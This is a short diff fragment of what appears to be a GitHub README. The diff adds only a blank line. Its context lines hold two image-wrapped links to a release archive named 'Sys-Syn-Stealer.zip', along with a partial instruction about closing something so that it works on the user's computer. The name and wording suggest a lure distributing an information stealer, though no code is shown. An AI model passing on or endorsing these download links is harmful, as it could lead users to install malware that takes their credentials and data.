@@ -69,3 +69,4 @@ you will have to close it afterwards for it to work on your computer.
 <a href="https://github.com/PaKiva/Sys-Syn-Stealer/releases/download/v1.7.9/Sys-Syn-Stealer.zip"><img width="982" height="416" alt="image" src="https://github.com/user-attachments/assets/da0179dc-65ca-4cfb-b1af-85be4c7c9cc3" /></a>
 <a href="https://github.com/PaKiva/Sys-Syn-Stealer/releases/download/v1.7.9/Sys-Syn-Stealer.zip"><img width="979" height="349" alt="image" src="https://github.com/user-attachments/assets/71e43da7-e68d-43b5-8ec9-a1c0f666fb94" /></a>
 
+
